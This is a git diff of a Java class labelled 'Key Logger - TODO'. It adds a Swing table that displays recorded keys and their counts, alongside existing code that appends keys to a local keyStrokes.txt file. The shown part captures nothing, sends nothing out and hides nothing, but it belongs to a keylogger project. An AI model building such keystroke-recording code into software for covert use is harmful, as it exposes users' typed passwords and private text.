@@ -10,6 +10,8 @@ import java.io.ObjectOutputStream;
 import java.util.HashMap;
 
 import javax.swing.JOptionPane;
+import javax.swing.JTable;
+import javax.swing.table.DefaultTableModel;
 
 /**
  * @author avAnkyAnkit last modified @18-Mar-2018 @12:53:08 AM Key Logger - TODO
@@ -18,9 +20,10 @@ import javax.swing.JOptionPane;
 public class FileReadWrite {
 	private String freq, keyStrokes;
 	private HashMap<String, Integer> keyMap;
+	private JTable jt;
 
-	public FileReadWrite(String path) {
-
+	public FileReadWrite(String path, JTable jt) {
+		this.jt = jt;
 		boolean present = false;
 		File dir = new File(path);
 		keyStrokes = dir.getAbsolutePath() + "//keyStrokes.txt";
@@ -45,6 +48,11 @@ public class FileReadWrite {
 	}
 
 	public void add(String s) {
+		System.out.println("adding " + s);
+		DefaultTableModel model = (DefaultTableModel) jt.getModel();
+		model.addRow(new Object[] { s, "1" });
+		// model.insertRow(model, new Object[]{"",""});
+
 		try {
 			ObjectInputStream inp = new ObjectInputStream(new FileInputStream(freq));
 			HashMap<String, Integer> keys = (HashMap<String, Integer>) inp.readObject();
@@ -66,6 +74,7 @@ public class FileReadWrite {
 	 * @param key
 	 */
 	public void addTofile(String key) {
+		System.out.println("adding to file " + key);
 		try {
 			FileWriter fileWriter = new FileWriter(keyStrokes, true);
 			BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
@@ -95,5 +104,14 @@ public class FileReadWrite {
 
 		}
 		return 0;
+	}
+
+	public void deleteTable() {
+		DefaultTableModel dm = (DefaultTableModel) jt.getModel();
+		int rowCount = dm.getRowCount();
+		// Remove rows one by one from the end of the table
+		for (int i = rowCount - 1; i >= 0; i--) {
+			dm.removeRow(i);
+		}
 	}
 }
